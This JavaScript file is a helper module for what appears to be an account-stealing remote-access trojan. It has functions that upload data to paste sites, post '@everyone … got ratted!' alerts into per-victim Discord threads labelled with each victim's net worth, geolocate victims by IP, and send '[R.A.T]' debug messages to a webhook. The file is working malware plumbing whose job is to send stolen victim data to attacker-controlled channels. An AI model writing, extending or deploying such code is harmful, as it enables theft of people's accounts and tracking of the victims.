const { post, get } = require("axios")

// Upload for uploading data shit like hastebin
async function uploadData(endpoint, data) {
    try {
        const response = await post(endpoint, data);
        return response.data.key;
    } catch (error) {
        console.error('Error uploading data:', error);
        return "Error uploading";
    }
}

// Create and manage discord threads
function threadHandler(content, embed, username, networth, client, channelId) {
    client.channels.fetch(channelId).then(async channel => {
        if (!channel) {
            console.error('Channel not found. Destroying client.');
            client.destroy();
            return;
        }

        // Fetch only active threads from the channel
        const activeThreads = await channel.threads.fetchActive();
        let thread = activeThreads.threads.find(t => t.name.includes(username));
        
        // Check whether thread exists
        if (thread) {
            await thread.send({ content: content, embeds: [embed] });
            
            if (thread.name !== `${username} - ${networth}`) {
                await thread.setName(`${username} - ${networth}`);
            }
        } else {
            // Send a message to the channel as a start for the new thread
            channel.send(`@everyone ${username} ${networth} got ratted! Creating new thread`).then(async message => {
                const newThread = await message.startThread({
                    name: `${username} - ${networth}`,
                    autoArchiveDuration: 60,
                });
                
                await newThread.send({ content: content, embeds: [embed] });
            }).catch(error => console.error('Error creating a thread:', error));
        }
    }).catch(error => console.error('Error fetching the channel:', error));
}

// Fetch country from ip
const fetchCountry = async (ip) => {
    // Set URL
    const apiUrl = `http://ip-api.com/json/${ip}`;

    try {
        // Send HTTP request
        const response = await fetch(apiUrl);

        if (!response.ok) {
            throw new Error('Network response was not ok');
        }

        // Fetch country
        const data = await response.json();

        return data.country;
    } catch (error) {
        // Return 'Unknown' in case of any errors
        return 'Unknown';
    }
}

// Format number into k/m/b
const formatNumber = (num) => {
    if (num < 1000) return num.toFixed(2)
    else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
    else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
    else return `${(num / 1000000000).toFixed(2)}b`
}

// Debugging
function sendMessage(message, webhook) {
    post(webhook, JSON.stringify({
        content: message, // ping
        attachments: []
    }), {
        headers: {
            "Content-Type": "application/json"
        }
    }).catch(err => {
        console.log(`[R.A.T] Error while debugging:\n${err}`);
    });
}


module.exports = {
    uploadData,
    threadHandler,
    sendMessage,
    formatNumber,
    fetchCountry
};